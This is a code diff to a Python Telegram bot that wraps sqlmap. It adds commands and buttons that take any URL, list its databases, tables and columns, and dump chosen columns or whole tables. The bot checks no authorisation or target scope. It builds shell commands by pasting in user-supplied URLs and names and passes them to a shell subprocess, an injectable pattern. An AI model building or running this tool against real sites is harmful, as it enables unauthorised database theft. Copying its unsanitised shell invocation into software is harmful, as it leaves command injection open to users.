@@ -3,7 +3,7 @@ import asyncio
 import re
 from collections import defaultdict
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 try:
     from dotenv import load_dotenv
@@ -11,7 +11,7 @@ try:
 except ImportError:
     pass
 
-user_sessions = defaultdict(lambda: {'url': None, 'options': set(), 'page': 0, 'session_id': None, 'custom_args': '', 'dump_state': None, 'databases': [], 'tables': [], 'selected_db': None})
+user_sessions = defaultdict(lambda: {'url': None, 'options': set(), 'page': 0, 'session_id': None, 'custom_args': '', 'dump_state': None, 'databases': [], 'tables': [], 'columns': [], 'selected_db': None, 'selected_table': None})
 
 ALL_OPTIONS = [
     {'Databases': '--dbs', 'Tables': '--tables', 'Columns': '--columns', 'Dump All': '--dump-all'},
@@ -65,6 +65,42 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• /continue - Add more options to scan"
     )
 
+async def sqlmap_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not context.args:
+        await update.message.reply_text("❌ Usage: /sqlmap http://target.com?id=1")
+        return
+    
+    url = context.args[0]
+    if not re.match(r'https?://', url):
+        await update.message.reply_text("❌ Invalid URL")
+        return
+    
+    session_id = re.sub(r'[^a-zA-Z0-9]', '_', url)[:50]
+    user_sessions[user_id] = {'url': url, 'options': set(), 'page': 0, 'session_id': session_id, 'custom_args': ''}
+    
+    await update.message.reply_text(
+        f"🌐 Target: `{url}`\n\n**Page 1/{len(ALL_OPTIONS)}**\n\n"
+        f"💡 Use /dump for interactive database dumping",
+        reply_markup=create_keyboard(user_id, 0),
+        parse_mode='Markdown'
+    )
+
+async def continue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    session = user_sessions.get(user_id)
+    
+    if not session or not session['url']:
+        await update.message.reply_text("❌ No active session. Start with /sqlmap <URL>")
+        return
+    
+    await update.message.reply_text(
+        f"💠 Continue: `{session['url']}`\n\n**Page 1/{len(ALL_OPTIONS)}**",
+        reply_markup=create_keyboard(user_id, 0),
+        parse_mode='Markdown'
+    )
+
 async def dump_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     session = user_sessions.get(user_id)
@@ -97,20 +133,6 @@ async def dump_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [[InlineKeyboardButton(db, callback_data=f"db_{db}")] for db in dbs]
     await update.message.reply_text("📊 Select database:", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def continue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    session = user_sessions.get(user_id)
-    
-    if not session or not session['url']:
-        await update.message.reply_text("❌ No active session. Start with /sqlmap <URL>")
-        return
-    
-    await update.message.reply_text(
-        f"💠 Continue: `{session['url']}`\n\n**Page 1/{len(ALL_OPTIONS)}**",
-        reply_markup=create_keyboard(user_id, 0),
-        parse_mode='Markdown'
-    )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -147,6 +169,74 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [[InlineKeyboardButton(t, callback_data=f"tbl_{t}")] for t in tables]
         await query.edit_message_text(f"📋 Select table from {db_name}:", reply_markup=InlineKeyboardMarkup(keyboard))
+    
+    # Table selection
+    elif data.startswith("tbl_"):
+        table_name = data[4:]
+        session['selected_table'] = table_name
+        await query.edit_message_text("🔍 Fetching columns...")
+        
+        cmd = f"python sqlmap.py -u {session['url']} -D {session['selected_db']} -T {table_name} --columns --batch"
+        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, cwd=os.path.dirname(__file__))
+        output, _ = await proc.communicate()
+        
+        columns = []
+        for line in output.decode().split('\n'):
+            if line.strip().startswith('|') and '|' in line[1:]:
+                parts = [p.strip() for p in line.split('|')]
+                if len(parts) > 1 and parts[1] and parts[1] not in ['Column', '']:
+                    columns.append(parts[1])
+        
+        if not columns:
+            await query.edit_message_text("❌ No columns found")
+            return
+        
+        session['columns'] = columns
+        session['dump_state'] = 'select_columns'
+        
+        keyboard = [[InlineKeyboardButton(f"{'✅ ' if c in session.get('selected_columns', set()) else ''}{c}", callback_data=f"col_{c}")] for c in columns]
+        keyboard.append([InlineKeyboardButton("🔰 Dump All Columns", callback_data="dump_all")])
+        keyboard.append([InlineKeyboardButton("✔️ Dump Selected", callback_data="dump_selected")])
+        
+        await query.edit_message_text(f"📝 Select columns from {table_name}:", reply_markup=InlineKeyboardMarkup(keyboard))
+    
+    # Column selection
+    elif data.startswith("col_"):
+        col_name = data[4:]
+        if 'selected_columns' not in session:
+            session['selected_columns'] = set()
+        
+        if col_name in session['selected_columns']:
+            session['selected_columns'].remove(col_name)
+        else:
+            session['selected_columns'].add(col_name)
+        
+        keyboard = [[InlineKeyboardButton(f"{'✅ ' if c in session['selected_columns'] else ''}{c}", callback_data=f"col_{c}")] for c in session['columns']]
+        keyboard.append([InlineKeyboardButton("🔰 Dump All Columns", callback_data="dump_all")])
+        keyboard.append([InlineKeyboardButton("✔️ Dump Selected", callback_data="dump_selected")])
+        
+        try:
+            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))
+        except Exception:
+            pass
+    
+    # Dump all columns
+    elif data == "dump_all":
+        session['custom_args'] = f"-D {session['selected_db']} --dump -T {session['selected_table']} --batch"
+        await query.edit_message_text("🔰 Dumping all columns... 🔰")
+        await run_scan(update.effective_chat.id, user_id, context)
+    
+    # Dump selected columns
+    elif data == "dump_selected":
+        if not session.get('selected_columns'):
+            await query.answer("❌ Select at least one column", show_alert=True)
+            return
+        
+        cols = ','.join(session['selected_columns'])
+        session['custom_args'] = f"-D {session['selected_db']} --dump -T {session['selected_table']} -C {cols} --batch"
+        await query.edit_message_text(f"🔰 Dumping columns: {cols}... 🔰")
+        await run_scan(update.effective_chat.id, user_id, context)
+        session['selected_columns'] = set()
     
     elif data.startswith("opt_"):
         _, page, label = data.split("_", 2)
@@ -211,7 +301,7 @@ async def run_scan(chat_id, user_id, context):
         full_output = '\n'.join(output)
         chunks = [full_output[i:i+3900] for i in range(0, len(full_output), 3900)]
         
-        await status_msg.edit_text("✅ Complete! Use /continue for more.")
+        await status_msg.edit_text("✅ Complete! Use /continue or /dump <table> for more.")
         for chunk in chunks[:3]:
             await context.bot.send_message(chat_id, f"```\n{chunk}\n```", parse_mode='Markdown')
         
@@ -228,27 +318,6 @@ async def run_scan(chat_id, user_id, context):
         session['options'].clear()
         session['custom_args'] = ''
 
-async def sqlmap_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /sqlmap http://target.com?id=1")
-        return
-    
-    url = context.args[0]
-    if not re.match(r'https?://', url):
-        await update.message.reply_text("❌ Invalid URL")
-        return
-    
-    session_id = re.sub(r'[^a-zA-Z0-9]', '_', url)[:50]
-    user_sessions[user_id] = {'url': url, 'options': set(), 'page': 0, 'session_id': session_id}
-    
-    await update.message.reply_text(
-        f"🌐 Target: `{url}`\n\n**Page 1/{len(ALL_OPTIONS)}**",
-        reply_markup=create_keyboard(user_id, 0),
-        parse_mode='Markdown'
-    )
-
 def main():
     token = os.getenv('TELEGRAM_TOKEN')
     if not token:
@@ -256,6 +325,7 @@ def main():
         exit(1)
     
     app = Application.builder().token(token).build()
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("sqlmap", sqlmap_cmd))
     app.add_handler(CommandHandler("continue", continue_cmd))
